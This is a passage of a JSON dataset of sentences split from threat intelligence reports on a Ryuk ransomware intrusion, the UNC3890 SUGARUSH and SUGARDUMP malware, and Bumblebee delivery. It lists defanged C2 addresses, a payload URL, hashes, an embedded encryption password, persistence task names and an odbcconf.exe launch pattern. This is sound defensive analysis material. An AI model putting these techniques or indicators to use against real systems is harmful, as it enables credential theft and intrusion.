    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S29",
        "text": "It appears that the threat actors are now piping these commands into a batch file one at a time instead of dropping adf.bat to disk.\n",
        "type": "",
        "report": "r-1117",
        "line": 29,
        "index": 3189
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S30",
        "text": "Once on the domain controller the PowerShell Active Directory module was loaded.\n",
        "type": "",
        "report": "r-1117",
        "line": 30,
        "index": 3190
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S31",
        "text": "RDP connections were initiated from Cobalt Strike Beacons running on the beachhead host to two domain controllers and then Cobalt Strike executables were dropped by these connections.\n",
        "type": "",
        "report": "r-1117",
        "line": 31,
        "index": 3191
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S32",
        "text": "In addition to using RDP to move around the environment execuatables were also transferred over SMB to ADMIN$ shares and executed as a service.\n",
        "type": "",
        "report": "r-1117",
        "line": 32,
        "index": 3192
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S33",
        "text": "Discovery data (AdFind and Rubeus outputs ) was exfiltrated out of the network via FTP.\n",
        "type": "",
        "report": "r-1117",
        "line": 33,
        "index": 3193
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S34",
        "text": "At roughly the 2 hour mark, we saw the threat actors begin to act on their final objectives.",
        "type": "",
        "report": "r-1117",
        "line": 34,
        "index": 3194
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S35",
        "text": "RDP connections were initiated from one of the domain controllers and the Ryuk executables were deployed and executed over these RDP connections.",
        "type": "",
        "report": "r-1117",
        "line": 35,
        "index": 3195
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S36",
        "text": "Servers such as the backup systems, file servers, and automation tools were targeted first, followed by workstations.\n",
        "type": "",
        "report": "r-1117",
        "line": 36,
        "index": 3196
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S37",
        "text": "Commands ran prior to ransom execution:\n",
        "type": "",
        "report": "r-1117",
        "line": 37,
        "index": 3197
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S38",
        "text": "While encryption was started 2 hours into the attack, by the 3 hour mark the actors had completed ransom of the entire environment.",
        "type": "",
        "report": "r-1117",
        "line": 38,
        "index": 3198
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S0",
        "text": "While Mandiant primarily identified post-exploitation implants utilized by UNC3890, there are some findings that shed light about their initial access methodologies.",
        "type": "",
        "report": "r-1122",
        "line": 0,
        "index": 3199
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S1",
        "text": "Mandiant identified UNC3890 potentially used the following initial access vectors:\n",
        "type": "",
        "report": "r-1122",
        "line": 1,
        "index": 3200
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S2",
        "text": "Watering holes \u2013",
        "type": "",
        "report": "r-1122",
        "line": 2,
        "index": 3201
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S3",
        "text": "Mandiant identified a potential watering hole hosted on a login page of a legitimate Israeli shipping company, which was likely compromised by UNC3890.",
        "type": "",
        "report": "r-1122",
        "line": 3,
        "index": 3202
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S4",
        "text": "The watering hole was active at least until November 2021, and upon entering the legitimate login page, the user would be sending a POST request with preliminary data about the logged user to an attacker controlled non-ASCII Punycode domain (lir\u0131kedin[.]com, interpreted as xn--lirkedin-vkb[.]com).",
        "type": "",
        "report": "r-1122",
        "line": 4,
        "index": 3203
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S5",
        "text": "The URL structure of the POST request: hxxps[:]//xn--lirkedin-vkb[.]com/object[.]php?browser=<user_browser>&ip=<user_ip>\n",
        "type": "",
        "report": "r-1122",
        "line": 5,
        "index": 3204
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S6",
        "text": "When we inspected the watering hole, it was already inactive, but it was most likely used to target clients and users of that Israeli shipping company, in particular, one\u2019s shipping or handling heat-sensitive cargo (based on the nature of the compromised website).",
        "type": "",
        "report": "r-1122",
        "line": 6,
        "index": 3205
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S7",
        "text": "We have an additional indication of an attempted targeting of another major Israeli shipping company by UNC3890, which is consistent with the watering hole.",
        "type": "",
        "report": "r-1122",
        "line": 7,
        "index": 3206
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S8",
        "text": "Credentials harvesting by masquerading as legitimate services \u2013 we uncovered several domains resolving to UNC3890\u2019s C2 servers.",
        "type": "",
        "report": "r-1122",
        "line": 8,
        "index": 3207
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S9",
        "text": "Some of the domains were masquerading as legitimate services and entities, as can be observed in the table below.",
        "type": "",
        "report": "r-1122",
        "line": 9,
        "index": 3208
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S10",
        "text": "UNC3890 may have used these domains to harvest credentials to legitimate services, to send phishing lures, or to overall mask their activity and blend in with expected network traffic.",
        "type": "",
        "report": "r-1122",
        "line": 10,
        "index": 3209
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S11",
        "text": "It should be noted that many of these domains were hosted on the same infrastructure used by UNC3890, but date back to late 2020, which is before we can corroborate UNC3890 has been active.\n",
        "type": "",
        "report": "r-1122",
        "line": 11,
        "index": 3210
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S12",
        "text": "In addition, we identified an UNC3890 server that hosted several ZIP files containing scraped contents of Facebook and Instagram accounts of legitimate individuals.",
        "type": "",
        "report": "r-1122",
        "line": 12,
        "index": 3211
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S13",
        "text": "It is possible they were targeted by UNC3890, or used as lures in a social engineering effort.",
        "type": "",
        "report": "r-1122",
        "line": 13,
        "index": 3212
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S14",
        "text": "Fake job offers, potentially as part of a phishing or watering hole campaign \u2013 we observed UNC3890 utilize a .xls lure file designed as a fake job offer (MD5: 639f83fa4265ddbb43e85b763fe3dbac) which installs SUGARDUMP, a credential harvesting tool.",
        "type": "",
        "report": "r-1122",
        "line": 14,
        "index": 3213
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S15",
        "text": "The job offer was for a software developer position in LexisNexis, a company offering a data analytics solution.",
        "type": "",
        "report": "r-1122",
        "line": 15,
        "index": 3214
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S16",
        "text": "Fake commercials for AI-based robotic dolls \u2013 one of UNC3890\u2019s most recent endeavor to target victims includes the usage of a video commercial for AI-based robotic dolls, used as a lure to deliver SUGARDUMP.",
        "type": "",
        "report": "r-1122",
        "line": 16,
        "index": 3215
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S17",
        "text": "In addition, we observed UNC3890 usage of domains with similar themes such as naturaldolls[.]store (hosting a fake Outlook login page) and xxx-doll[.]com.",
        "type": "",
        "report": "r-1122",
        "line": 17,
        "index": 3216
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S18",
        "text": "In addition, UNC3890 infrastructure hosted a fake page for the alleged purchasing of robotic dolls, redirecting victims to an attacker controlled infrastructure.",
        "type": "",
        "report": "r-1122",
        "line": 18,
        "index": 3217
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S19",
        "text": "After gaining initial access, UNC3890 utilizes a broad toolset to access and control the victim\u2019s environment.",
        "type": "",
        "report": "r-1122",
        "line": 19,
        "index": 3218
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S20",
        "text": "In this sector we will focus on the analysis of two of UNC3890\u2019s proprietary tools we identified in our investigation: the SUGARUSH backdoor, and the SUGARDUMP credential harvesting tool.",
        "type": "",
        "report": "r-1122",
        "line": 20,
        "index": 3219
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S21",
        "text": "We will also provide a brief analysis of the public tools utilized by UNC3890.\n",
        "type": "",
        "report": "r-1122",
        "line": 21,
        "index": 3220
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S22",
        "text": "Most of the tools were available for download directly from UNC3890 controlled infrastructure, indicating they may have been served as 1st stage implants.",
        "type": "",
        "report": "r-1122",
        "line": 22,
        "index": 3221
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S23",
        "text": "Alternatively, they may have been used as 2nd stages (or later), but UNC3890 may have misconfigured their infrastructure, making it publicly accessible.\n",
        "type": "",
        "report": "r-1122",
        "line": 23,
        "index": 3222
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S24",
        "text": "SUGARUSH is a small custom backdoor that establishes a reverse shell over TCP to a hardcoded C&C address.",
        "type": "",
        "report": "r-1122",
        "line": 24,
        "index": 3223
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S25",
        "text": "Upon first execution, SUGARUSH will create a new service called \u201cService1\u201d.",
        "type": "",
        "report": "r-1122",
        "line": 25,
        "index": 3224
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S26",
        "text": "Subsequently, SUGARUSH creates a logging folder called \u201cLogs\u201d, and stores it under its current execution path.",
        "type": "",
        "report": "r-1122",
        "line": 26,
        "index": 3225
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S27",
        "text": "A new folder named\n",
        "type": "",
        "report": "r-1122",
        "line": 27,
        "index": 3226
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S28",
        "text": "\u201cServiceLog\u201d is created in the \u201cLogs\u201d folder, and a new log file is written with the message \u201cService is started at <current_date>\u201d.",
        "type": "",
        "report": "r-1122",
        "line": 28,
        "index": 3227
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S29",
        "text": "The name of the log files is the current date of the infected machine.\n",
        "type": "",
        "report": "r-1122",
        "line": 29,
        "index": 3228
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S30",
        "text": "SUGARUSH will then check for internet connectivity of the host and will create a log file indicating the result with message \u201cYou are online at <current_date>\u201d or \u201cYou are offline at <current_date>\u201d.",
        "type": "",
        "report": "r-1122",
        "line": 30,
        "index": 3229
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S31",
        "text": "If the attempt for internet connection is successful, SUGARUSH will establish a new TCP connection to an embedded C&C address via port 4585.\n",
        "type": "",
        "report": "r-1122",
        "line": 31,
        "index": 3230
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S32",
        "text": "SUGARUSH then waits to receive an answer from the C2 which will be interpreted as a CMD command for execution.\n",
        "type": "",
        "report": "r-1122",
        "line": 32,
        "index": 3231
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S33",
        "text": "SUGARUSH Samples:\n",
        "type": "",
        "report": "r-1122",
        "line": 33,
        "index": 3232
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S34",
        "text": "SUGARDUMP is a small custom utility used for harvesting credentials from Chrome, Opera and Edge Chromium browsers.",
        "type": "",
        "report": "r-1122",
        "line": 34,
        "index": 3233
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S35",
        "text": "When executed SUGARDUMP will access the following paths:\n",
        "type": "",
        "report": "r-1122",
        "line": 35,
        "index": 3234
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S36",
        "text": "Out of each path SUGARDUMP will attempt collect specific folders:\n",
        "type": "",
        "report": "r-1122",
        "line": 36,
        "index": 3235
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S37",
        "text": "Afterwards, SUGARDUMP will extract all of the available usernames and passwords from these folders.\n",
        "type": "",
        "report": "r-1122",
        "line": 37,
        "index": 3236
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S38",
        "text": "The collected information is subsequently stored in the following format:\n",
        "type": "",
        "report": "r-1122",
        "line": 38,
        "index": 3237
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S39",
        "text": "We observed several versions of SUGARDUMP:\n",
        "type": "",
        "report": "r-1122",
        "line": 39,
        "index": 3238
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S40",
        "text": "- SUGARDUMP first known version, dated to early 2021.",
        "type": "",
        "report": "r-1122",
        "line": 40,
        "index": 3239
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S41",
        "text": "This early version stores the credentials without exfiltrating them.",
        "type": "",
        "report": "r-1122",
        "line": 41,
        "index": 3240
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S42",
        "text": "It is possible it was an unfinished version, or that UNC3890 used other tools and/or manually connect to the victim to exfiltrate the stolen credentials.",
        "type": "",
        "report": "r-1122",
        "line": 42,
        "index": 3241
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S43",
        "text": "- SUGARDUMP using SMTP-based communication, dated to late 2021-early 2022.",
        "type": "",
        "report": "r-1122",
        "line": 43,
        "index": 3242
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S44",
        "text": "This version utilizes Yahoo, Yandex and Gmail addresses for exfiltration, and uses a commercial AI-driven robotic dolls as a lure.\n",
        "type": "",
        "report": "r-1122",
        "line": 44,
        "index": 3243
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S45",
        "text": "- SUGARDUMP using HTTPs-based communication, dated to April 2022.",
        "type": "",
        "report": "r-1122",
        "line": 45,
        "index": 3244
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S46",
        "text": "This version uses a fake NexisLexis job offer as a lure.\n",
        "type": "",
        "report": "r-1122",
        "line": 46,
        "index": 3245
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S47",
        "text": "SUGARDUMP first known version \u2013 dated to early 2021, we observed two variants of this version: the first one saves the stolen credentials under in a .txt file under the path: \u201cC:\\\\Users\\\\User\\\\Desktop\\\\test2.txt\u201d.",
        "type": "",
        "report": "r-1122",
        "line": 47,
        "index": 3246
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S48",
        "text": "The second variant prints the stolen credentials as a CMD output.\n",
        "type": "",
        "report": "r-1122",
        "line": 48,
        "index": 3247
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S49",
        "text": "We observed two PDB paths contained in SUGARDUMP samples:\n",
        "type": "",
        "report": "r-1122",
        "line": 49,
        "index": 3248
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S50",
        "text": "- C:\\Users\\User\\source\\repos \\passrecover\\passrecover\\obj\\Release\\passrecover.pdb \u2013 we observed a similar PDB path (the part in bold ) used in a toolset (for example, MD5: 69b2ab3369823032991d4b306a170425) by UNC2448, an actor affiliated with Iran, which was mentioned in a U.S. government statement in November 17, 2021.",
        "type": "",
        "report": "r-1122",
        "line": 50,
        "index": 3249
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S51",
        "text": "Since this is a rather generic PDB path, this similarity may be circumstantial, and we consider it a weak link.",
        "type": "",
        "report": "r-1122",
        "line": 51,
        "index": 3250
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S52",
        "text": "- C:\\Users\\User\\Desktop\\sourc\\Chrome-Password-Recovery-master\\Chrome-Password-Recovery-master\\obj\\Debug\\ChromeRecovery.pdb\n",
        "type": "",
        "report": "r-1122",
        "line": 52,
        "index": 3251
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S53",
        "text": "SUGARDUMP using SMTP for C2 communication \u2013 dated to late 2021-early 2022.",
        "type": "",
        "report": "r-1122",
        "line": 53,
        "index": 3252
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S54",
        "text": "This variant was downloaded from a known UNC3890 C2 (URL: hxxp://128.199.6[.]246/3-Video-VLC.exe), and is a slightly more advanced version with similar credential harvesting functionality.",
        "type": "",
        "report": "r-1122",
        "line": 54,
        "index": 3253
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S55",
        "text": "The downloaded file \u201c3-Video-VLC.exe\u201d (MD5: ae0a16b6feddd53d1d52ff50d85a42d5) is a Windows installer which, upon execution, drops and executes two files under the path %AppData%\\\\Roaming\\\\:\n",
        "type": "",
        "report": "r-1122",
        "line": 55,
        "index": 3254
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S56",
        "text": "- CrashReporter.exe (MD5: 084ad50044d6650f9ed314e99351a608) \u2013 a browser credential harvesting tool (SUGARDUMP). \n",
        "type": "",
        "report": "r-1122",
        "line": 56,
        "index": 3255
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S57",
        "text": "- RealDo1080.mp4 (MD5: d8fb3b6f5681cf5eec2b89be9b632b05) \u2013 a social engineering video, played using Windows Media Player while CrashReporter.exe is executed.",
        "type": "",
        "report": "r-1122",
        "line": 57,
        "index": 3256
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S58",
        "text": "The video contains a commercial for AI-driven robotic dolls.",
        "type": "",
        "report": "r-1122",
        "line": 58,
        "index": 3257
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S59",
        "text": "Upon first execution, CrashReporter.exe (SUGARDUMP) attempts to locate the folder: %AppData%\\\\Microsoft\\\\Edge\\\\User Data\\\\CrashPad\\\\\n",
        "type": "",
        "report": "r-1122",
        "line": 59,
        "index": 3258
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S60",
        "text": "If it wasn\u2019t found it will search for folder: %AppData%\\\\Microsoft\\\\Internet Explorer\\\\TabRoaming\\\\\n",
        "type": "",
        "report": "r-1122",
        "line": 60,
        "index": 3259
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S61",
        "text": "If the latter folder is not found as well, the malware proceeds to create it.",
        "type": "",
        "report": "r-1122",
        "line": 61,
        "index": 3260
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S62",
        "text": "The malware will then copy itself into \u201cTabRoaming\u201d folder again under the name \u201cCrashReporter.exe\u201d.",
        "type": "",
        "report": "r-1122",
        "line": 62,
        "index": 3261
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S63",
        "text": "Subsequently, a scheduled task is created, which ensures the persistence of this version of SUGARDUMP:\n",
        "type": "",
        "report": "r-1122",
        "line": 63,
        "index": 3262
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S64",
        "text": "- In Windows 7 the scheduled task is called: \"MicrosoftInternetExplorerCrashRepoeterTaskMachineUA\", and contains the description \"Keep your Microsoft software without any bugs.",
        "type": "",
        "report": "r-1122",
        "line": 64,
        "index": 3263
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S65",
        "text": "If this task is disabled or stopped, your Microsoft software may not work properly, meaning bugs that may arise cannot be fixed and features may not work.\u201d",
        "type": "",
        "report": "r-1122",
        "line": 65,
        "index": 3264
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S66",
        "text": "- In other Windows OS versions the scheduled task is called: \"MicrosoftEdgeCrashRepoeterTaskMachineUA\", and contains the description \u201cKeep your Microsoft software without any bugs.",
        "type": "",
        "report": "r-1122",
        "line": 66,
        "index": 3265
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S67",
        "text": "If this task is disabled or stopped, your Edge browser may not work properly, meaning bugs that may arise cannot be fixed and features may not work.\u201d",
        "type": "",
        "report": "r-1122",
        "line": 67,
        "index": 3266
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S68",
        "text": "The scheduled task is configured to execute CrashReporter.exe during user logon.\n",
        "type": "",
        "report": "r-1122",
        "line": 68,
        "index": 3267
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S69",
        "text": "The malware then attempts to connect to \u201csmtp.yandex.com\u201d and \u201csmtp.mail.yahoo.com\u201d via port 587.",
        "type": "",
        "report": "r-1122",
        "line": 69,
        "index": 3268
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S70",
        "text": "If the attempt is successful, the malware starts to harvest bowser related information on the host.",
        "type": "",
        "report": "r-1122",
        "line": 70,
        "index": 3269
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S71",
        "text": "This version of SUGARDUMP harvest credentials from the following browsers:\n",
        "type": "",
        "report": "r-1122",
        "line": 71,
        "index": 3270
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S72",
        "text": "- Firefox (added functionality with relation to the previous version )\n",
        "type": "",
        "report": "r-1122",
        "line": 72,
        "index": 3271
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S73",
        "text": "- Chrome\n",
        "type": "",
        "report": "r-1122",
        "line": 73,
        "index": 3272
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S74",
        "text": "- Opera\n",
        "type": "",
        "report": "r-1122",
        "line": 74,
        "index": 3273
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S75",
        "text": "- Edge\n",
        "type": "",
        "report": "r-1122",
        "line": 75,
        "index": 3274
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S76",
        "text": "For each browser the malware attempts to extract login credentials from the following paths:\n",
        "type": "",
        "report": "r-1122",
        "line": 76,
        "index": 3275
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S77",
        "text": "This version of SUGARDUMP also extracts the browser\u2019s version, browsing history, bookmarks, and cookies.",
        "type": "",
        "report": "r-1122",
        "line": 77,
        "index": 3276
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S78",
        "text": "The extracted data structure looks as follows:\n",
        "type": "",
        "report": "r-1122",
        "line": 78,
        "index": 3277
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S79",
        "text": "The collected data is subsequently encoded using base64 and stored under: %<malware_execution_folder>%\\\\CrashLog.txt\n",
        "type": "",
        "report": "r-1122",
        "line": 79,
        "index": 3278
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S80",
        "text": "The malware will then send the file \u201cCrashLog.txt\u201d via email, by connecting and sending it from one of the two following email addresses:\n",
        "type": "",
        "report": "r-1122",
        "line": 80,
        "index": 3279
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S81",
        "text": "The email is sent to one of these four email addresses:\n",
        "type": "",
        "report": "r-1122",
        "line": 81,
        "index": 3280
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S82",
        "text": "The subject for each message would be \u201cVLC Player\u201d, with \u201cCrashLog.txt\u201d attached.\n",
        "type": "",
        "report": "r-1122",
        "line": 82,
        "index": 3281
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S83",
        "text": "If SUGARDUMP fails to send the message, it creates a new file under: %<malware_current_execution_path>%\\\\CrashLogName.txt, and writes to the file the error details.",
        "type": "",
        "report": "r-1122",
        "line": 83,
        "index": 3282
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S84",
        "text": "\"CrashLogName.txt\" is also sent via email, using the same method mentioned above.",
        "type": "",
        "report": "r-1122",
        "line": 84,
        "index": 3283
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S85",
        "text": "Afterwards, the malware terminates its execution.",
        "type": "",
        "report": "r-1122",
        "line": 85,
        "index": 3284
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S86",
        "text": "SUGARDUMP using HTTP for C2 communication \u2013 dated to April 2022, this version sends the stolen credentials to an UNC3890 C2 server (144.202.123[.]248:80).",
        "type": "",
        "report": "r-1122",
        "line": 86,
        "index": 3285
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S87",
        "text": "We observed this version dropped by a .xls file which contains a fake job offer to a software developer position in NexisLexis, a data analytics platform (MD5: 639f83fa4265ddbb43e85b763fe3dbac).",
        "type": "",
        "report": "r-1122",
        "line": 87,
        "index": 3286
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S88",
        "text": "The .xls file contains a Macro, which upon enablement attempts to execute an embedded PE file using RunDLL (MD5: e125ed072fc4529687d98cf4c62e283e).",
        "type": "",
        "report": "r-1122",
        "line": 88,
        "index": 3287
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S89",
        "text": "The PE file is the newest version of SUGARDUMP we observed so far.",
        "type": "",
        "report": "r-1122",
        "line": 89,
        "index": 3288
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S90",
        "text": "Like previous versions, this version of SUGARDUMP harvests credentials from Chromium-based browsers Chrome, Opera and Edge.",
        "type": "",
        "report": "r-1122",
        "line": 90,
        "index": 3289
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S91",
        "text": "The data is saved in a new file under %TEMP%\\\\DebugLogWindowsDefender.txt.\n",
        "type": "",
        "report": "r-1122",
        "line": 91,
        "index": 3290
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S92",
        "text": "The collected data is subsequently encrypted using AES encryption using Cipher Block Chaining (CBC) mode.",
        "type": "",
        "report": "r-1122",
        "line": 92,
        "index": 3291
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S93",
        "text": "The encryption key is the Sha256 of an embedded password: \u201c1qazXSW@3edc123456be name KHODA 110 !!)1qazXSW@3edc\u201d.",
        "type": "",
        "report": "r-1122",
        "line": 93,
        "index": 3292
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S94",
        "text": "The word \u201cKHODA\u201d means god in Farsi.",
        "type": "",
        "report": "r-1122",
        "line": 94,
        "index": 3293
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S95",
        "text": "After the encryption process, the data is also encoded using Base64, and subsequently sent over HTTP to an UNC3890 C2 server: 144.202.123[.]248:80.\n",
        "type": "",
        "report": "r-1122",
        "line": 95,
        "index": 3294
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S96",
        "text": "The .NET project for this version of SUGARDUMP was named \"yaal\", which is the Farsi word for a horse\u2019s mane.",
        "type": "",
        "report": "r-1122",
        "line": 96,
        "index": 3295
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S97",
        "text": "This, along with the use of the word \u201cKHODA\u201d in SUGARDUMP\u2019s encryption key, may strengthen the possibility that the developers of SUGARDUMP are Farsi speakers.",
        "type": "",
        "report": "r-1122",
        "line": 97,
        "index": 3296
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S98",
        "text": "SUGARDUMP Samples:\n",
        "type": "",
        "report": "r-1122",
        "line": 98,
        "index": 3297
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S0",
        "text": "Cybereason GSOC team observed the following distribution method to deliver the Bumblebee malware:\n",
        "type": "",
        "report": "r-1177",
        "line": 0,
        "index": 3298
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S1",
        "text": "- A spear phishing email is received containing an archive or a link to an external source to download the archive.\n",
        "type": "",
        "report": "r-1177",
        "line": 1,
        "index": 3299
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S2",
        "text": "- User extracts the archive and mounts the resulting ISO image.\n",
        "type": "",
        "report": "r-1177",
        "line": 2,
        "index": 3300
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S3",
        "text": "- The content of the mounted ISO image is a LNK file executing the Bumblebee payload upon user interaction:\n",
        "type": "",
        "report": "r-1177",
        "line": 3,
        "index": 3301
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S4",
        "text": "Bumblebee operators host malicious websites that implement a drive-by download.",
        "type": "",
        "report": "r-1177",
        "line": 4,
        "index": 3302
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S5",
        "text": "To infect the system, an end-user has to first manually decompress the archive containing the ISO file, mount the file and then execute the Windows shortcut (LNK).\n",
        "type": "",
        "report": "r-1177",
        "line": 5,
        "index": 3303
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S6",
        "text": "The LNK file has an embedded command to run Bumblebee Dynamic-link library (DLL) using odbcconf.exe Living Off the Land Binary (LOLBin) and response (.rsp) file.",
        "type": "",
        "report": "r-1177",
        "line": 6,
        "index": 3304
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S7",
        "text": "The file [Bumblebee specific name].rsp has the reference to the Bumblebee DLL:\n",
        "type": "",
        "report": "r-1177",
        "line": 7,
        "index": 3305
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S8",
        "text": "Odbcconf.exe loadsBumblebee DLL with the internal name LdrAddx64.dll",
        "type": "",
        "report": "r-1177",
        "line": 8,
        "index": 3306
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S9",
        "text": ".",
        "type": "",
        "report": "r-1177",
        "line": 9,
        "index": 3307
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S10",
        "text": "The figure below illustrates the ISO image content (DLL, RSP and LNK files) for Bumblebee:\n",
        "type": "",
        "report": "r-1177",
        "line": 10,
        "index": 3308
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S11",
        "text": "Bumblebee DLL is executed using odbcconf.exe -f [Bumblebee specific name].rsp in the LNK file target property.",
        "type": "",
        "report": "r-1177",
        "line": 11,
        "index": 3309
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S12",
        "text": "[Bumblebee specific name].rsp has a reference to [Bumblebee specific name].dll which is the Bumblebee payload\n",
        "type": "",
        "report": "r-1177",
        "line": 12,
        "index": 3310
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S13",
        "text": "After the initial infection, Bumblebee injects code into multiple processes in order to establish a strong foothold on infected endpoints.",
        "type": "",
        "report": "r-1177",
        "line": 13,
        "index": 3311
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S14",
        "text": "The process odbcconf.exe creates local Windows Management Instrumentation (WMI) calls to spawn new processes.",
        "type": "",
        "report": "r-1177",
        "line": 14,
        "index": 3312
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S15",
        "text": "As a result, the following two processes are spawned from wmiprivse.exe (Windows Management Instrumentation Provider Service) :\n",
        "type": "",
        "report": "r-1177",
        "line": 15,
        "index": 3313
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S16",
        "text": "- wabmig.exe (Microsoft contacts import tool) with injected Meterpreter agent code (Meterpreter agent is a security product used for penetration testing and provides remote control capabilities).",
        "type": "",
        "report": "r-1177",
        "line": 16,
        "index": 3314
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S17",
        "text": "- wab.exe (Microsoft address book application) with an injected Cobalt Strike beacon:\n",
        "type": "",
        "report": "r-1177",
        "line": 17,
        "index": 3315
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S18",
